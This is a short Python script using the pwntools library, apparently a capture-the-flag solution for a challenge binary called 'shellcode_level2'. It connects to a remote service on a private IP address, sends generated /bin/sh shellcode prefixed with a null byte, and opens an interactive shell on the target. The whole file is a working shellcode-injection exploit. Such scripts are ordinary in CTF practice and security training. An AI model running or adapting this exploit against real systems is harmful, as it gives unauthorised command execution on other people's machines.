from pwn import * 
from pwn import p64,u64
# from LibcSearcher import *

debug = 0
gdb_is = 0
# context(arch='i386',os = 'linux')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./shellcode_level2")
    
else:
    host = "192.168.0.111:62338"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0

if gdb_is:
    # r = gdb.debug("./shellcode_level2",'b main')
    # gdb.attach(r,'b main')
    pass
   
elf = ELF('./shellcode_level2')
shellcode = asm(shellcraft.sh())
r.sendline(b'\x00'+shellcode)
r.interactive()
